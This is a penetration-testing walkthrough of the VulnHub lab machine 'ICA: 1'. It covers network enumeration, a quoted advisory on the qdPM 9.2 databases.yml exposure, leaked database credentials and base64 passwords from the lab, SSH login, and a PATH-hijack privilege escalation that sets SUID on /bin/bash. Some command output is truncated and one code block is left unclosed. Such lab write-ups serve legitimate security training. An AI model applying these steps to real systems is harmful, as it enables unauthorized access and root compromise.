# Introduction
-------------

This writeup documents the penetration testing of the [**ICA: 1**]([ICA: 1 ~ VulnHub](https://www.vulnhub.com/entry/ica-1,748/)) machine. This machine has been downloaded from the [**VulnHub**](https://vulnhub.com) platform.  In this case I'll exploit a vulnerable web tool that exposes the credentials of the DB and I'll gain access into the server.

# Information Gathering
------------------

Firstly, we need to discover the IP of the **ICA** machine. We will use **arp-scan**.

![](/assets/images/vh-ica1/arp_scan.png)

After identifying the target's IP address, we need to enumerate as  much information as possible about the host.

A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. [**ttl-ripper.sh**](https://github.com/Akronox/WichSystem.py) can also be used for this purpose.
* TTL 64: Linux.
* TTL 128: Windows.

In this case, it appears to be a Linux machine.

**extractPorts** reads the grepable export file allPorts, shows me the open ports and copy them in the clipboard. Let's perform a deeper scan with the parameter ``-sCV`` over those ports.

You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s [Enumeration Cheat Sheet](https://pwnerguy.github.io/enumeration-cheatsheet/), which includes a table mapping service versions to possible operating system versions. We are facing a **Debian Bullseye**.

We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80:

> **qdPM** is a **free, web-based project management tool** designed primarily for small teams to manage projects, tasks, and customer support. It allows you to organize work, track progress, and manage users and clients through an integrated ticketing system.

# Vulnerability Assessment
-----------

![](/assets/images/vh-ica1/searchsploit.png)

**searchsploit** found 2 exploits for the version 9.2 of qdPM. I'll focus on this project management tool, since we have to discover someting about a project. Let's see the second exploit.

```
# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.#
```

<br>
# Exploitation
--------

I'll download databases.yml and connect to the DB.

```yml
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true
```

![](/assets/images/vh-ica1/mysql.png)

In the table users from the qdpm DB there is nothing.

```
MySQL [staff]> use staff;
Database changed

MySQL [staff]> show tables;
+-----------------+

+------+---------------+--------+---------------------------+
5 rows in set (0,001 sec)

MySQL [staff]> select * from login;
+------+---------+--------------------------+

+------+---------+--------------------------+

|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
5 rows in set (0,005 sec)
```

I have created a file named users (with the users of the DB) and other file named passwords.

```
❯ for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee passwords

We can now access via SSH as travis and dexter with their credentials.

 ``cat /root/system.info`` is a command that is being executed by root using a relative route, so I can hijack it.

It's simple: create a file named ``cat`` with execution permission that gives the SUID permission to ``/bin/bash``, export the directory where this file is (for example /tmp) to the PATH and execute the file ``/opt/get_access``.
